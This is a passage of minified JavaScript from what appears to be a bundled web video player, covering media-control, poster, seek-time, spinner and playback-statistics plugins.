t=this.playback&&this.playback.el;!Bn.fullscreenEnabled()&&t.webkitSupportsFullscreen&&(this.fullScreenOnVideoTagSupported=!0,this.settingsUpdate())}},{key:"updateVolumeUI",value:function e(){if(this.rendered){this.$volumeBarContainer.find(".bar-fill-2").css({});var t=this.$volumeBarContainer.width(),r=this.$volumeBarBackground.width(),n=(t-r)/2,i=r*this.volume/100+n;this.$volumeBarFill.css({width:"".concat(this.volume,"%")}),this.$volumeBarScrubber.css({left:i}),this.$volumeBarContainer.find(".segmented-bar-element").removeClass("fill");var a=Math.ceil(this.volume/10);this.$volumeBarContainer.find(".segmented-bar-element").slice(0,a).addClass("fill"),this.$volumeIcon.html(""),this.$volumeIcon.removeClass("muted"),this.muted?(this.$volumeIcon.append('<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16">\n  <path fill-rule="evenodd" clip-rule="evenodd" fill="#010101" d="M9.75 11.51L6.7 9.5H3.75v-3H6.7L9.75 4.49v.664l.497.498V3.498L6.547 6H3.248v4h3.296l3.7 2.502v-2.154l-.497.5v.662zm3-5.165L12.404 6l-1.655 1.653L9.093 6l-.346.345L10.402 8 8.747 9.654l.346.347 1.655-1.653L12.403 10l.348-.346L11.097 8l1.655-1.655z"/>\n</svg>'),this.$volumeIcon.addClass("muted")):this.$volumeIcon.append(Dn),this.applyButtonStyle(this.$volumeIcon)}}},{key:"changeTogglePlay",value:function e(){this.$playPauseToggle.html(""),this.$playStopToggle.html(""),this.container&&this.container.isPlaying()?(this.$playPauseToggle.append(_n),this.$playStopToggle.append(In),this.trigger(k.MEDIACONTROL_PLAYING)):(this.$playPauseToggle.append(kn),this.$playStopToggle.append(kn),this.trigger(k.MEDIACONTROL_NOTPLAYING),E.isMobile&&this.show()),this.applyButtonStyle(this.$playPauseToggle),this.applyButtonStyle(this.$playStopToggle)}},{key:"mousemoveOnSeekBar",value:function e(t){if(this.settings.seekEnabled){var r=t.pageX-this.$seekBarContainer.offset().left-this.$seekBarHover.width()/2;this.$seekBarHover.css({left:r})}this.trigger(k.MEDIACONTROL_MOUSEMOVE_SEEKBAR,t)}},{key:"mouseleaveOnSeekBar",value:function e(t){this.trigger(k.MEDIACONTROL_MOUSELEAVE_SEEKBAR,t)}},{key:"onVolumeClick",value:function e(t){this.setVolume(this.getVolumeFromUIEvent(t))}},{key:"mousemoveOnVolumeBar",value:function e(t){this.draggingVolumeBar&&this.setVolume(this.getVolumeFromUIEvent(t))}},{key:"playerResize",value:function e(t){this.$fullscreenToggle.html("");var r=this.core.isFullscreen()?'<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16">\n  <path fill="#010101" d="M13.5 3.344l-.844-.844L9.5 5.656V3h-1v4.5H13v-1h-2.656L13.5 3.344zM3 9.5h2.656L2.5 12.656l.844.844L6.5 10.344V13h1V8.5H3v1z"/>\n</svg>':Nn;this.$fullscreenToggle.append(r),this.applyButtonStyle(this.$fullscreenToggle),0!==this.$el.find(".media-control").length&&this.$el.removeClass("w320"),(t.width<=320||this.options.hideVolumeBar)&&this.$el.addClass("w320")}},{key:"togglePlayPause",value:function e(){return this.container.isPlaying()?this.container.pause():this.container.play(),!1}},{key:"togglePlayStop",value:function e(){this.container.isPlaying()?this.container.stop():this.container.play()}},{key:"startSeekDrag",value:function e(t){this.settings.seekEnabled&&(this.draggingSeekBar=!0,this.$el.addClass("dragging"),this.$seekBarLoaded.addClass("media-control-notransition"),this.$seekBarPosition.addClass("media-control-notransition"),this.$seekBarScrubber.addClass("media-control-notransition"),t&&t.preventDefault())}},{key:"startVolumeDrag",value:function e(t){this.draggingVolumeBar=!0,this.$el.addClass("dragging"),t&&t.preventDefault()}},{key:"stopDrag",value:function e(t){this.draggingSeekBar&&this.seek(t),this.$el.removeClass("dragging"),this.$seekBarLoaded.removeClass("media-control-notransition"),this.$seekBarPosition.removeClass("media-control-notransition"),this.$seekBarScrubber.removeClass("media-control-notransition dragging"),this.draggingSeekBar=!1,this.draggingVolumeBar=!1}},{key:"updateDrag",value:function e(t){if(this.draggingSeekBar){t.preventDefault();var n=(t.pageX-this.$seekBarContainer.offset().left)/this.$seekBarContainer.width()*100;n=Math.min(100,Math.max(n,0)),this.setSeekPercentage(n)}else this.draggingVolumeBar&&(t.preventDefault(),this.setVolume(this.getVolumeFromUIEvent(t)))}},{key:"getVolumeFromUIEvent",value:function e(t){return(t.pageX-this.$volumeBarContainer.offset().left)/this.$volumeBarContainer.width()*100}},{key:"toggleMute",value:function e(){this.setVolume(this.muted?100:0)}},{key:"setVolume",value:function e(t){var r=this,n=arguments.length>1&&void 0!==arguments[1]&&arguments[1];t=Math.min(100,Math.max(t,0)),this.intendedVolume=t,this.persistConfig&&!n&&Fn.persist("volume",t);var i=function e(){r.container&&r.container.isReady?r.container.setVolume(t):r.listenToOnce(r.container,k.CONTAINER_READY,(function(){r.container.setVolume(t)}))};this.container?i():this.listenToOnce(this,k.MEDIACONTROL_CONTAINERCHANGED,(function(){return i()}))}},{key:"toggleFullscreen",value:function e(){this.trigger(k.MEDIACONTROL_FULLSCREEN,this.name),this.container.fullscreen(),this.core.toggleFullscreen(),this.resetUserKeepVisible()}},{key:"onActiveContainerChanged",value:function e(){this.fullScreenOnVideoTagSupported=null,this.bindEvents(),this.setInitialVolume(),this.changeTogglePlay(),this.bindContainerEvents(),this.settingsUpdate(),this.container&&this.container.trigger(k.CONTAINER_PLAYBACKDVRSTATECHANGED,this.container.isDvrInUse()),this.container&&this.container.mediaControlDisabled&&this.disable(),this.trigger(k.MEDIACONTROL_CONTAINERCHANGED)}},{key:"showVolumeBar",value:function e(){this.hideVolumeId&&clearTimeout(this.hideVolumeId),this.$volumeBarContainer.removeClass("volume-bar-hide")}},{key:"hideVolumeBar",value:function e(){var t=this,r=arguments.length>0&&void 0!==arguments[0]?arguments[0]:400;this.$volumeBarContainer&&(this.draggingVolumeBar?this.hideVolumeId=setTimeout((function(){return t.hideVolumeBar()}),r):(this.hideVolumeId&&clearTimeout(this.hideVolumeId),this.hideVolumeId=setTimeout((function(){return t.$volumeBarContainer.addClass("volume-bar-hide")}),r)))}},{key:"ended",value:function e(){this.changeTogglePlay()}},{key:"updateProgressBar",value:function e(t){var r=t.start/t.total*100,n=t.current/t.total*100;this.$seekBarLoaded.css({left:"".concat(r,"%"),width:"".concat(n-r,"%")})}},{key:"onTimeUpdate",value:function e(t){if(!this.draggingSeekBar){var r=t.current<0?t.total:t.current;this.currentPositionValue=r,this.currentDurationValue=t.total,this.renderSeekBar()}}},{key:"renderSeekBar",value:function e(){if(null!==this.currentPositionValue&&null!==this.currentDurationValue){this.currentSeekBarPercentage=100,this.container&&(this.container.getPlaybackType()!==S.LIVE||this.container.isDvrInUse())&&(this.currentSeekBarPercentage=this.currentPositionValue/this.currentDurationValue*100),this.setSeekPercentage(this.currentSeekBarPercentage);var t=Un(this.currentPositionValue),r=Un(this.currentDurationValue);t!==this.displayedPosition&&(this.$position.text(t),this.displayedPosition=t),r!==this.displayedDuration&&(this.$duration.text(r),this.displayedDuration=r)}}},{key:"seek",value:function e(t){if(this.settings.seekEnabled){var n=(t.pageX-this.$seekBarContainer.offset().left)/this.$seekBarContainer.width()*100;return n=Math.min(100,Math.max(n,0)),this.container&&this.container.seekPercentage(n),this.setSeekPercentage(n),!1}}},{key:"setKeepVisible",value:function e(){this.keepVisible=!0}},{key:"resetKeepVisible",value:function e(){this.keepVisible=!1}},{key:"setUserKeepVisible",value:function e(){this.userKeepVisible=!0}},{key:"resetUserKeepVisible",value:function e(){this.userKeepVisible=!1}},{key:"isVisible",value:function e(){return!this.$el.hasClass("media-control-hide")}},{key:"show",value:function e(t){var r=this;if(!this.disabled){var i=t&&t.clientX!==this.lastMouseX&&t.clientY!==this.lastMouseY;(!t||i||navigator.userAgent.match(/firefox/i))&&(clearTimeout(this.hideId),this.$el.show(),this.trigger(k.MEDIACONTROL_SHOW,this.name),this.container&&this.container.trigger(k.CONTAINER_MEDIACONTROL_SHOW,this.name),this.$el.removeClass("media-control-hide"),this.hideId=setTimeout((function(){return r.hide()}),2e3),t&&(this.lastMouseX=t.clientX,this.lastMouseY=t.clientY));this.updateCursorStyle(!0)}}},{key:"hide",value:function e(){var t=this,r=arguments.length>0&&void 0!==arguments[0]?arguments[0]:0;if(this.isVisible()){var n=r||2e3;if(clearTimeout(this.hideId),this.disabled||!1!==this.options.hideMediaControl){var i=this.userKeepVisible||this.keepVisible,a=this.draggingSeekBar||this.draggingVolumeBar;if(!this.disabled&&(r||i||a))this.hideId=setTimeout((function(){return t.hide()}),n);else{this.trigger(k.MEDIACONTROL_HIDE,this.name),this.container&&this.container.trigger(k.CONTAINER_MEDIACONTROL_HIDE,this.name),this.$el.addClass("media-control-hide"),this.hideVolumeBar(0);this.updateCursorStyle(!1)}}}}},{key:"updateCursorStyle",value:function e(t){t?this.core.$el.removeClass("nocursor"):this.core.isFullscreen()&&this.core.$el.addClass("nocursor")}},{key:"settingsUpdate",value:function e(){var t=this.getSettings();!t||this.fullScreenOnVideoTagSupported||Bn.fullscreenEnabled()||(t.default&&Vn(t.default,"fullscreen"),t.left&&Vn(t.left,"fullscreen"),t.right&&Vn(t.right,"fullscreen")),JSON.stringify(this.settings)!==JSON.stringify(t)&&(this.settings=t,this.render())}},{key:"getSettings",value:function e(){return y.extend(!0,{},this.container&&this.container.settings)}},{key:"highDefinitionUpdate",value:function e(t){this.isHD=t;var r=t?"addClass":"removeClass";this.$hdIndicator[r]("enabled")}},{key:"createCachedElements",value:function e(){var t=this.$el.find(".media-control-layer");this.$duration=t.find(".media-control-indicator[data-duration]"),this.$fullscreenToggle=t.find("button.media-control-button[data-fullscreen]"),this.$playPauseToggle=t.find("button.media-control-button[data-playpause]"),this.$playStopToggle=t.find("button.media-control-button[data-playstop]"),this.$position=t.find(".media-control-indicator[data-position]"),this.$seekBarContainer=t.find(".bar-container[data-seekbar]"),this.$seekBarHover=t.find(".bar-hover[data-seekbar]"),this.$seekBarLoaded=t.find(".bar-fill-1[data-seekbar]"),this.$seekBarPosition=t.find(".bar-fill-2[data-seekbar]"),this.$seekBarScrubber=t.find(".bar-scrubber[data-seekbar]"),this.$volumeBarContainer=t.find(".bar-container[data-volume]"),this.$volumeContainer=t.find(".drawer-container[data-volume]"),this.$volumeIcon=t.find(".drawer-icon[data-volume]"),this.$volumeBarBackground=this.$el.find(".bar-background[data-volume]"),this.$volumeBarFill=this.$el.find(".bar-fill-1[data-volume]"),this.$volumeBarScrubber=this.$el.find(".bar-scrubber[data-volume]"),this.$hdIndicator=this.$el.find("button.media-control-button[data-hd-indicator]"),this.resetIndicators(),this.initializeIcons()}},{key:"resetIndicators",value:function e(){this.displayedPosition=this.$position.text(),this.displayedDuration=this.$duration.text()}},{key:"initializeIcons",value:function e(){var t=this.$el.find(".media-control-layer");t.find("button.media-control-button[data-play]").append(kn),t.find("button.media-control-button[data-pause]").append(_n),t.find("button.media-control-button[data-stop]").append(In),this.$playPauseToggle.append(kn),this.$playStopToggle.append(kn),this.$volumeIcon.append(Dn),this.$fullscreenToggle.append(Nn),this.$hdIndicator.append('<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 16">\n  <path fill="#010101" d="M5.375 7.062H2.637V4.26H.502v7.488h2.135V8.9h2.738v2.848h2.133V4.26H5.375v2.802zm5.97-2.81h-2.84v7.496h2.798c2.65 0 4.195-1.607 4.195-3.77v-.022c0-2.162-1.523-3.704-4.154-3.704zm2.06 3.758c0 1.21-.81 1.896-2.03 1.896h-.83V6.093h.83c1.22 0 2.03.696 2.03 1.896v.02z"/>\n</svg>')}},{key:"setSeekPercentage",value:function e(t){t=Math.max(Math.min(t,100),0),this.displayedSeekBarPercentage!==t&&(this.displayedSeekBarPercentage=t,this.$seekBarPosition.removeClass("media-control-notransition"),this.$seekBarScrubber.removeClass("media-control-notransition"),this.$seekBarPosition.css({width:"".concat(t,"%")}),this.$seekBarScrubber.css({left:"".concat(t,"%")}))}},{key:"seekRelative",value:function e(t){if(this.settings.seekEnabled){var r=this.container.getCurrentTime(),n=this.container.getDuration(),i=Math.min(Math.max(r+t,0),n);i=Math.min(100*i/n,100),this.container.seekPercentage(i)}}},{key:"bindKeyAndShow",value:function e(t,r){var n=this;this.kibo.down(t,(function(){return n.show(),r()}))}},{key:"bindKeyEvents",value:function e(){var t=this;if(!E.isMobile&&!this.options.disableKeyboardShortcuts){this.unbindKeyEvents(),this.kibo=new D(this.options.focusElement||this.options.parentElement),this.bindKeyAndShow("space",(function(){return t.togglePlayPause()})),this.bindKeyAndShow("left",(function(){return t.seekRelative(-5)})),this.bindKeyAndShow("right",(function(){return t.seekRelative(5)})),this.bindKeyAndShow("shift left",(function(){return t.seekRelative(-10)})),this.bindKeyAndShow("shift right",(function(){return t.seekRelative(10)})),this.bindKeyAndShow("shift ctrl left",(function(){return t.seekRelative(-15)})),this.bindKeyAndShow("shift ctrl right",(function(){return t.seekRelative(15)}));["1","2","3","4","5","6","7","8","9","0"].forEach((function(e){t.bindKeyAndShow(e,(function(){t.settings.seekEnabled&&t.container&&t.container.seekPercentage(10*e)}))}))}}},{key:"unbindKeyEvents",value:function e(){this.kibo&&(this.kibo.off("space"),this.kibo.off("left"),this.kibo.off("right"),this.kibo.off("shift left"),this.kibo.off("shift right"),this.kibo.off("shift ctrl left"),this.kibo.off("shift ctrl right"),this.kibo.off(["1","2","3","4","5","6","7","8","9","0"]))}},{key:"parseColors",value:function e(){if(this.options.mediacontrol){this.buttonsColor=this.options.mediacontrol.buttons;var t=this.options.mediacontrol.seekbar;this.$el.find(".bar-fill-2[data-seekbar]").css("background-color",t),this.$el.find(".media-control-icon svg path").css("fill",this.buttonsColor),this.$el.find(".segmented-bar-element[data-volume]").css("boxShadow","inset 2px 0 0 "+this.buttonsColor)}}},{key:"applyButtonStyle",value:function e(t){this.buttonsColor&&t&&y(t).find("svg path").css("fill",this.buttonsColor)}},{key:"destroy",value:function e(){y(document).unbind("mouseup",this.stopDragHandler),y(document).unbind("mousemove",this.updateDragHandler),this.unbindKeyEvents(),this.stopListening(),on(en(n.prototype),"destroy",this).call(this)}},{key:"configure",value:function e(t){this.options.chromeless||t.source||t.sources?this.disable():this.enable(),this.trigger(k.MEDIACONTROL_OPTIONS_CHANGE)}},{key:"render",value:function e(){var t=this,r=this.options.hideMediaControlDelay||2e3;this.settings&&this.$el.html(this.template({settings:this.settings})),this.createCachedElements(),this.$playPauseToggle.addClass("paused"),this.$playStopToggle.addClass("stopped"),this.changeTogglePlay(),this.container&&(this.hideId=setTimeout((function(){return t.hide()}),r),this.disabled&&this.hide()),E.isSafari&&E.isMobile&&(E.version<10?this.$volumeContainer.css("display","none"):this.$volumeBarContainer.css("display","none")),this.$seekBarPosition.addClass("media-control-notransition"),this.$seekBarScrubber.addClass("media-control-notransition");var n=0;return this.displayedSeekBarPercentage&&(n=this.displayedSeekBarPercentage),this.displayedSeekBarPercentage=null,this.setSeekPercentage(n),setTimeout((function(){!t.settings.seekEnabled&&t.$seekBarContainer.addClass("seek-disabled"),!E.isMobile&&!t.options.disableKeyboardShortcuts&&t.bindKeyEvents(),t.playerResize({width:t.options.width,height:t.options.height}),t.hideVolumeBar(0)}),0),this.parseColors(),this.highDefinitionUpdate(this.isHD),this.core.$el.append(this.el),this.rendered=!0,this.updateVolumeUI(),this.trigger(k.MEDIACONTROL_RENDERED),this}}]),n}(i),Kn=(Gn.extend=function(e){return jn(Gn,e)},'<div class="play-wrapper" data-poster></div>\n'),Hn=(dn(".player-poster[data-poster] {\n  display: flex;\n  justify-content: center;\n  align-items: center;\n  position: absolute;\n  height: 100%;\n  width: 100%;\n  z-index: 998;\n  top: 0;\n  left: 0;\n  background-color: transparent;\n  background-size: cover;\n  background-repeat: no-repeat;\n  background-position: 50% 50%; }\n  .player-poster[data-poster].clickable {\n    cursor: pointer; }\n  .player-poster[data-poster]:hover .play-wrapper[data-poster] {\n    opacity: 1; }\n  .player-poster[data-poster] .play-wrapper[data-poster] {\n    width: 100%;\n    height: 25%;\n    margin: 0 auto;\n    opacity: 0.75;\n    transition: opacity 0.1s ease; }\n    .player-poster[data-poster] .play-wrapper[data-poster] svg {\n      height: 100%; }\n      .player-poster[data-poster] .play-wrapper[data-poster] svg path {\n        fill: #fff; }\n"),function(e){L(n,e);var r=I(n);function n(e){var t;return w(this,n),(t=r.call(this,e)).hasStartedPlaying=!1,t.playRequested=!1,t.render(),setTimeout((function(){return t.update()}),0),t}return O(n,[{key:"name",get:function e(){return"poster"}},{key:"supportedVersion",get:function e(){return{min:"0.4.18"}}},{key:"template",get:function e(){return _(Kn)}},{key:"shouldRender",get:function e(){var t=!(!this.options.poster||!this.options.poster.showForNoOp);return"html_img"!==this.container.playback.name&&(this.container.playback.getPlaybackType()!==S.NO_OP||t)}},{key:"attributes",get:function e(){return{class:"player-poster","data-poster":""}}},{key:"events",get:function e(){return{click:"clicked"}}},{key:"showOnVideoEnd",get:function e(){return!this.options.poster||this.options.poster.showOnVideoEnd||void 0===this.options.poster.showOnVideoEnd}},{key:"bindEvents",value:function e(){this.listenTo(this.container,k.CONTAINER_STOP,this.onStop),this.listenTo(this.container,k.CONTAINER_PLAY,this.onPlay),this.listenTo(this.container,k.CONTAINER_STATE_BUFFERING,this.update),this.listenTo(this.container,k.CONTAINER_STATE_BUFFERFULL,this.update),this.listenTo(this.container,k.CONTAINER_OPTIONS_CHANGE,this.render),this.listenTo(this.container,k.CONTAINER_ERROR,this.onError),this.showOnVideoEnd&&this.listenTo(this.container,k.CONTAINER_ENDED,this.onStop)}},{key:"onError",value:function e(t){this.hasFatalError=t.level===T.Levels.FATAL,this.hasFatalError&&(this.hasStartedPlaying=!1,this.playRequested=!1,this.showPlayButton())}},{key:"onPlay",value:function e(){this.hasStartedPlaying=!0,this.update()}},{key:"onStop",value:function e(){this.hasStartedPlaying=!1,this.playRequested=!1,this.update()}},{key:"updatePlayButton",value:function e(t){!t||this.options.chromeless&&!this.options.allowUserInteraction?this.hidePlayButton():this.showPlayButton()}},{key:"showPlayButton",value:function e(){this.hasFatalError&&!this.options.disableErrorScreen||(this.$playButton.show(),this.$el.addClass("clickable"))}},{key:"hidePlayButton",value:function e(){this.$playButton.hide(),this.$el.removeClass("clickable")}},{key:"clicked",value:function e(){if(!this.hasStartedPlaying)return this.options.chromeless&&!this.options.allowUserInteraction||(this.playRequested=!0,this.update(),this.container.playback&&(this.container.playback._consented=!0),this.container.play()),!1}},{key:"shouldHideOnPlay",value:function e(){return!this.container.playback.isAudioOnly}},{key:"update",value:function e(){if(this.shouldRender){var t=!this.playRequested&&!this.hasStartedPlaying&&!this.container.buffering;this.updatePlayButton(t),this.updatePoster()}}},{key:"updatePoster",value:function e(){this.hasStartedPlaying?this.hidePoster():this.showPoster()}},{key:"showPoster",value:function e(){this.container.disableMediaControl(),this.$el.show()}},{key:"hidePoster",value:function e(){this.container.enableMediaControl(),this.shouldHideOnPlay()&&this.$el.hide()}},{key:"render",value:function e(){if(this.shouldRender){if(this.$el.html(this.template()),this.options.poster&&void 0===this.options.poster.custom){var r=this.options.poster.url||this.options.poster;this.$el.css({"background-image":"url("+r+")"}),this.removeVideoElementPoster()}else this.options.poster&&(this.$el.css({background:this.options.poster.custom}),this.removeVideoElementPoster());this.container.$el.append(this.el),this.$playWrapper=this.$el.find(".play-wrapper"),this.$playWrapper.append(kn),this.$playButton=this.$playWrapper.find("svg"),this.$playButton.addClass("poster-icon"),this.$playButton.attr("data-poster","");var n=this.options.mediacontrol&&this.options.mediacontrol.buttons;return n&&this.$el.find("svg path").css("fill",n),this.options.mediacontrol&&this.options.mediacontrol.buttons&&(n=this.options.mediacontrol.buttons,this.$playButton.css("color",n)),this.update(),this}}},{key:"removeVideoElementPoster",value:function e(){this.container.playback&&this.container.playback.$el&&this.container.playback.$el[0]&&this.container.playback.$el[0].removeAttribute&&this.container.playback.$el[0].removeAttribute("poster")}}]),n}(C)),Wn=(dn('.seek-time[data-seek-time] {\n  position: absolute;\n  white-space: nowrap;\n  height: 20px;\n  line-height: 20px;\n  font-size: 0;\n  left: -100%;\n  bottom: 55px;\n  background-color: rgba(2, 2, 2, 0.5);\n  z-index: 9999;\n  transition: opacity 0.1s ease; }\n  .seek-time[data-seek-time].hidden[data-seek-time] {\n    opacity: 0; }\n  .seek-time[data-seek-time] [data-seek-time] {\n    display: inline-block;\n    color: white;\n    font-size: 10px;\n    padding-left: 7px;\n    padding-right: 7px;\n    vertical-align: top; }\n  .seek-time[data-seek-time] [data-duration] {\n    display: inline-block;\n    color: rgba(255, 255, 255, 0.5);\n    font-size: 10px;\n    padding-right: 7px;\n    vertical-align: top; }\n    .seek-time[data-seek-time] [data-duration]:before {\n      content: "|";\n      margin-right: 7px; }\n'),t.formatTime),qn=function(e){L(n,e);var r=I(n);function n(e){var t;return w(this,n),(t=r.call(this,e)).hoveringOverSeekBar=!1,t.hoverPosition=null,t.duration=null,t.firstFragDateTime=null,t.actualLiveTime=!!t.mediaControl.options.actualLiveTime,t.actualLiveTime&&(t.mediaControl.options.actualLiveServerTime?t.actualLiveServerTimeDiff=(new Date).getTime()-new Date(t.mediaControl.options.actualLiveServerTime).getTime():t.actualLiveServerTimeDiff=0),t}return O(n,[{key:"name",get:function e(){return"seek_time"}},{key:"supportedVersion",get:function e(){return{min:"0.4.18"}}},{key:"template",get:function e(){return _("<span data-seek-time></span>\n<span data-duration></span>\n")}},{key:"attributes",get:function e(){return{class:"seek-time","data-seek-time":""}}},{key:"mediaControl",get:function e(){return this.core.mediaControl}},{key:"mediaControlContainer",get:function e(){return this.mediaControl.container}},{key:"isLiveStreamWithDvr",get:function e(){return this.mediaControlContainer&&this.mediaControlContainer.getPlaybackType()===S.LIVE&&this.mediaControlContainer.isDvrEnabled()}},{key:"durationShown",get:function e(){return this.isLiveStreamWithDvr&&!this.actualLiveTime}},{key:"useActualLiveTime",get:function e(){return this.actualLiveTime&&this.isLiveStreamWithDvr}},{key:"bindEvents",value:function e(){this.listenTo(this.mediaControl,k.MEDIACONTROL_RENDERED,this.render),this.listenTo(this.mediaControl,k.MEDIACONTROL_MOUSEMOVE_SEEKBAR,this.showTime),this.listenTo(this.mediaControl,k.MEDIACONTROL_MOUSELEAVE_SEEKBAR,this.hideTime),this.listenTo(this.mediaControl,k.MEDIACONTROL_CONTAINERCHANGED,this.onContainerChanged),this.mediaControlContainer&&(this.listenTo(this.mediaControlContainer,k.CONTAINER_PLAYBACKDVRSTATECHANGED,this.update),this.listenTo(this.mediaControlContainer,k.CONTAINER_TIMEUPDATE,this.updateDuration))}},{key:"onContainerChanged",value:function e(){this.stopListening(),this.bindEvents()}},{key:"updateDuration",value:function e(t){this.duration=t.total,this.firstFragDateTime=t.firstFragDateTime,this.update()}},{key:"showTime",value:function e(t){this.hoveringOverSeekBar=!0,this.calculateHoverPosition(t),this.update()}},{key:"hideTime",value:function e(){this.hoveringOverSeekBar=!1,this.update()}},{key:"calculateHoverPosition",value:function e(t){var r=t.pageX-this.mediaControl.$seekBarContainer.offset().left;this.hoverPosition=Math.min(1,Math.max(r/this.mediaControl.$seekBarContainer.width(),0))}},{key:"getSeekTime",value:function e(){var t,r,n,i;return this.useActualLiveTime?(this.firstFragDateTime?(i=new Date(this.firstFragDateTime),(n=new Date(this.firstFragDateTime)).setHours(0,0,0,0),r=(i.getTime()-n.getTime())/1e3+this.duration):(n=new Date((new Date).getTime()-this.actualLiveServerTimeDiff),r=((i=new Date(n))-n.setHours(0,0,0,0))/1e3),(t=r-this.duration+this.hoverPosition*this.duration)<0&&(t+=86400)):t=this.hoverPosition*this.duration,{seekTime:t,secondsSinceMidnight:r}}},{key:"update",value:function e(){if(this.rendered)if(this.shouldBeVisible()){var t=this.getSeekTime(),r=Wn(t.seekTime,this.useActualLiveTime);if(r!==this.displayedSeekTime&&(this.$seekTimeEl.text(r),this.displayedSeekTime=r),this.durationShown){this.$durationEl.show();var n=Wn(this.actualLiveTime?t.secondsSinceMidnight:this.duration,this.actualLiveTime);n!==this.displayedDuration&&(this.$durationEl.text(n),this.displayedDuration=n)}else this.$durationEl.hide();this.$el.show();var i=this.mediaControl.$seekBarContainer.width(),a=this.$el.width(),s=this.hoverPosition*i;s-=a/2,s=Math.max(0,Math.min(s,i-a)),this.$el.css("left",s)}else this.$el.hide(),this.$el.css("left","-100%")}},{key:"shouldBeVisible",value:function e(){return this.mediaControlContainer&&this.mediaControlContainer.settings.seekEnabled&&this.hoveringOverSeekBar&&null!==this.hoverPosition&&null!==this.duration}},{key:"render",value:function e(){this.rendered=!0,this.displayedDuration=null,this.displayedSeekTime=null,this.$el.html(this.template()),this.$el.hide(),this.mediaControl.$el.append(this.el),this.$seekTimeEl=this.$el.find("[data-seek-time]"),this.$durationEl=this.$el.find("[data-duration]"),this.$durationEl.hide(),this.update()}}]),n}(i),Qn=(dn(".spinner-three-bounce[data-spinner] {\n  position: absolute;\n  margin: 0 auto;\n  width: 70px;\n  text-align: center;\n  z-index: 999;\n  left: 0;\n  right: 0;\n  margin-left: auto;\n  margin-right: auto;\n  /* center vertically */\n  top: 50%;\n  transform: translateY(-50%); }\n  .spinner-three-bounce[data-spinner] > div {\n    width: 18px;\n    height: 18px;\n    background-color: #FFFFFF;\n    border-radius: 100%;\n    display: inline-block;\n    -webkit-animation: bouncedelay 1.4s infinite ease-in-out;\n            animation: bouncedelay 1.4s infinite ease-in-out;\n    /* Prevent first frame from flickering when animation starts */\n    -webkit-animation-fill-mode: both;\n            animation-fill-mode: both; }\n  .spinner-three-bounce[data-spinner] [data-bounce1] {\n    -webkit-animation-delay: -0.32s;\n            animation-delay: -0.32s; }\n  .spinner-three-bounce[data-spinner] [data-bounce2] {\n    -webkit-animation-delay: -0.16s;\n            animation-delay: -0.16s; }\n\n@-webkit-keyframes bouncedelay {\n  0%, 80%, 100% {\n    transform: scale(0); }\n  40% {\n    transform: scale(1); } }\n\n@keyframes bouncedelay {\n  0%, 80%, 100% {\n    transform: scale(0); }\n  40% {\n    transform: scale(1); } }\n"),function(e){L(n,e);var r=I(n);function n(e){var t;return w(this,n),(t=r.call(this,e)).template=_("<div data-bounce1></div><div data-bounce2></div><div data-bounce3></div>\n"),t.showTimeout=null,t.listenTo(t.container,k.CONTAINER_STATE_BUFFERING,t.onBuffering),t.listenTo(t.container,k.CONTAINER_STATE_BUFFERFULL,t.onBufferFull),t.listenTo(t.container,k.CONTAINER_STOP,t.onStop),t.listenTo(t.container,k.CONTAINER_ENDED,t.onStop),t.listenTo(t.container,k.CONTAINER_ERROR,t.onStop),t.render(),t}return O(n,[{key:"name",get:function e(){return"spinner"}},{key:"supportedVersion",get:function e(){return{min:"0.4.18"}}},{key:"attributes",get:function e(){return{"data-spinner":"",class:"spinner-three-bounce"}}},{key:"onBuffering",value:function e(){this.show()}},{key:"onBufferFull",value:function e(){this.hide()}},{key:"onStop",value:function e(){this.hide()}},{key:"show",value:function e(){var t=this;null===this.showTimeout&&(this.showTimeout=setTimeout((function(){return t.$el.show()}),300))}},{key:"hide",value:function e(){null!==this.showTimeout&&(clearTimeout(this.showTimeout),this.showTimeout=null),this.$el.hide()}},{key:"render",value:function e(){return this.$el.html(this.template()),this.container.$el.append(this.$el),this.$el.hide(),this.container.buffering&&this.onBuffering(),this}}]),n}(C)),Jn=function(e){L(n,e);var r=I(n);function n(e){var t;return w(this,n),(t=r.call(this,e)).setInitialAttrs(),t.reportInterval=t.options.reportInterval||5e3,t.state="IDLE",t}return O(n,[{key:"name",get:function e(){return"stats"}},{key:"supportedVersion",get:function e(){return{min:"0.4.18"}}},{key:"bindEvents",value:function e(){this.listenTo(this.container.playback,k.PLAYBACK_PLAY,this.onPlay),this.listenTo(this.container,k.CONTAINER_STOP,this.onStop),this.listenTo(this.container,k.CONTAINER_ENDED,this.onStop),this.listenTo(this.container,k.CONTAINER_DESTROYED,this.onStop),this.listenTo(this.container,k.CONTAINER_STATE_BUFFERING,this.onBuffering),this.listenTo(this.container,k.CONTAINER_STATE_BUFFERFULL,this.onBufferFull),this.listenTo(this.container,k.CONTAINER_STATS_ADD,this.onStatsAdd),this.listenTo(this.container,k.CONTAINER_BITRATE,this.onStatsAdd),this.listenTo(this.container.playback,k.PLAYBACK_STATS_ADD,this.onStatsAdd)}},{key:"setInitialAttrs",value:function e(){this.firstPlay=!0,this.startupTime=0,this.rebufferingTime=0,this.watchingTime=0,this.rebuffers=0,this.externalMetrics={}}},{key:"onPlay",value:function e(){this.state="PLAYING",this.watchingTimeInit=Date.now(),this.intervalId||(this.intervalId=setInterval(this.report.bind(this),this.reportInterval))}},{key:"onStop",value:function e(){clearInterval(this.intervalId),this.report(),this.intervalId=void 0,this.state="STOPPED"}},{key:"onBuffering",value:function e(){this.firstPlay?this.startupTimeInit=Date.now():this.rebufferingTimeInit=Date.now(),this.state="BUFFERING",this.rebuffers++}},{key:"onBufferFull",value:function e(){this.firstPlay&&this.startupTimeInit?(this.firstPlay=!1,this.startupTime=Date.now()-this.startupTimeInit,this.watchingTimeInit=Date.now()):this.rebufferingTimeInit&&(this.rebufferingTime+=this.getRebufferingTime()),this.rebufferingTimeInit=void 0,this.state="PLAYING"}},{key:"getRebufferingTime",value:function e(){return Date.now()-this.rebufferingTimeInit}},{key:"getWatchingTime",value:function e(){return Date.now()-this.watchingTimeInit-this.rebufferingTime}},{key:"isRebuffering",value:function e(){return!!this.rebufferingTimeInit}},{key:"onStatsAdd",value:function e(t){y.extend(this.externalMetrics,t)}},{key:"getStats",value:function e(){var 